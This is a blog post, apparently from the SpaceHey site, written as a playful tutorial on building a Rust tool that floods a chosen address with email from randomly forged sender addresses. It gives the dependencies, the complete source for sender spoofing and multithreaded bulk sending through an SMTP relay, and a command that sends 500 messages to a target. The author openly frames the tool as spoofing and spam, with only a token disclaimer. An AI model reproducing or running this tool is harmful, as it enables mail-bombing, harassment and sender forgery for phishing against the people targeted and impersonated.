@@ -1,0 +1,141 @@
+🖤 sad's guide to sending an email (spoofing spammer) 🖤
+Coffin
+subject: HOW TO SEND AN EMAIL 101
+yung innanet · SMTP
+Howdy!
+Today we will be learning how to send an email!!
+Lets dive in shall we?
+So what is an email?
+Let me break it down for you in a way that will make your black-painted nails and dark heart sing.
+So, you know how you can send instant messages to your friends, right?
+Well, emails are like messages, but they're sent through a special system called SMTP (Simple Mail Transfer Protocol).
+Think of it like this: you're writing a letter (the email), and you need to put it in an envelope (the SMTP). Then, you give the envelope to a mail carrier (the internet), who takes it to the post office (the recipient's email server), where it gets delivered to the recipient's mailbox (their email inbox).
+SMTP is the system that takes care of the envelope and delivery process. It makes sure that your email gets to where it needs to go, and it's responsible for things like checking that the email address is valid and handling any errors that might come up along the way.
+You can use SMTP to your advantage. For example, you can use it to send emails that look like they're coming from someone else (known as spoofing)! its like putting on a mask on Halloween and screaming LOOK AT ME!
+Lets get into how we can do this...
+First steps:
+lets create a new project
+cargo new email && cd email
+next we need to open up that Cargo.toml in our preference of IDE and slap in our much needed dependencies
+[dependencies]
+lettre = { version = "0.10.3"}
+lettre_email = "0.9.4"
+futures = "0.3.27"
+tokio = { version = "1.26.0", features = ["full"] }
+rand = "0.8"
+random_word = "0.3.0"
+cool now open up src/main.rs and and the ones we will be using right on top :3
+use lettre::transport::smtp::authentication::Credentials;
+use lettre::{Message, Address, SmtpTransport, Transport, message::Mailbox};
+use tokio::task;
+use std::env;
+use tokio::runtime::Builder;
+use rand::Rng;
+use random_word::gen;
+epic now we need to add some code lets start with a new function
+fn random_email_address() -> Address {
+    let mut rng = rand::thread_rng();
+    let local_part = gen(); // Updated to use random_word
+    let domain_name = gen();
+    // feel free to add more tlds here
+    let tld = ["com", "net", "org", "io", "co", "gay"]; 
+    let tld_idx = rng.gen_range(0..tld.len());
+    let email = format!("{}@{}.{}", local_part, domain_name, tld[tld_idx]);
+    email.parse().unwrap()
+}
+meowzers! now what do you think this does?
+this generates a random email address! this way you dont have to sign up for like 55-5000 email addresses, I don't even know how to sign up for email, so this is my best method!
+local_part is just the username that we will randomly generate
+domain_name just generates a random domain name
+and tld just uses a random one in our list, (tld is what comes at the end of a domain lol)
+next lets define a send_email function to handle processing of sending emails.
+async fn send_email(
+    to_email: String,
+    subject: String,
+    body: String
+) -> Result<(), Box<dyn std::error::Error>> {
+    // Create the email
+    let from = Mailbox::new(None, random_email_address());
+    let email = Message::builder()
+        .from(from)
+        .to(to_email.parse().unwrap())
+        .subject(subject)
+        .body(body.to_string())?;
+okay so we define this with async as we want it to be asynchronous as well as pass the email we want to send to, the subject, and the body.
+then we create the email format!
+the from address we just have set to call the function we made earlier random_email_address
+then we have the to, subject, and body, we will have those set as arguments later on in the next function
+Next we have to setup the SMTP client
+    // Set up the SMTP client
+    let creds = Credentials::new("g1r".to_string(), "GET YOUR 0WN PASSWORD!!!".to_string());
+    let smtp_server = "mail.tcp.wiki";
+    let mailer = SmtpTransport::relay(smtp_server)?
+        .credentials(creds)
+        .build();
+    // Send the email using spawn_blocking
+    task::spawn_blocking(move || {
+        mailer.send(&email).map_err(|e| eprintln!("Error sending email: {}", e))
+    });
+    println!("[+] Email sent!");
+    Ok(())
+}
+so this is the SMTP client, we define our credentials in it, replace mail.tcp.wiki with your own smtp server and g1r and the password with your own :D
+then we have spawn_blocking, basically we are using tokio's multi-threading to send as many emails as you want fast and efficiently,
+now to move onto the main function
+fn main() -> Result<(), Box<dyn std::error::Error>> {
+    let args: Vec<String> = env::args().collect();
+    if args.len() != 5 {
+        eprintln!("Usage: {} <number_of_emails> <to_email> <subject> <body>", args[0]);
+        std::process::exit(1);
+    }
+    let num_emails = args[1].parse::<usize>().expect("Invalid number of emails");
+    let to_email = args[2].clone();
+    let subject = args[3].clone();
+    let body = args[4].clone();
+so here we set the arguments!
+as you can see we have a usage arg aswell to explain how to use it
+now lets add the Tokio runtime
+    // Create a Tokio runtime with the required number of worker threads
+    let runtime = Builder::new_multi_thread()
+        .worker_threads(num_emails)
+        .enable_all()
+        .build()
+        .unwrap();
+    runtime.block_on(async {
+        let mut tasks = Vec::new();
+        for _ in 0..num_emails {
+            // Spawn a new task for each email
+            let task = send_email(to_email.clone(), subject.clone(), body.clone());
+            tasks.push(task);
+        }
+        // Wait for all tasks to complete
+        futures::future::join_all(tasks).await;
+        Ok(())
+    })
+}
+so now we take the num_emails value and set that to the amount of threads and spawn a task in the amount of emails then take the to email, subject, and body and send it to the send_email function!!!
+SICK now lets test it!!
+we will use temp-mail.org for testing!
+now once u have your targets email address you can go ahead and run the binary
+email 500 vigobim810@oniecan.com "EPIC SUBJECT" "SICK ASS BODY RIGHT HERE"
+remember replace the email with the one you want to email, if you haven't compiled it yet run
+cargo run -- 500 vigobim810@oniecan.com "EPIC SUBJECT" "SICK ASS BODY RIGHT HERE"
+now lets see the results...
+WOW LOOK DAD!! I SENT AN EMAIL!!!hhh
+HURRAY!! WE SENT AN EMAIL!!!!
+Remember, this is just a fun little project, so please don't use it for anything naughty! 🖤
+Feel free to leave your thoughts and suggestions and SPAM in the comments.
+Stay dark, shady and mysterious🌙
+7 Kudos
+Give 1 Kudos. — Give 2 Kudos
+Comments
+Displaying 1 of 1 comments ( View all | Add Comment )
+mit
+mit's profile picture  
+4 months ago
+meow emial
+Report Comment
+brought to you by tibush labs
+Disclaimer: This is a fan-based project and is not affiliated with MySpace® in any way.
+    About News Rules Press Brand Credits RSS Terms Privacy Imprint Contact Advertise Status SpaceHey Shop 
+©2023 SpaceHey.com All Rights Reserved.@
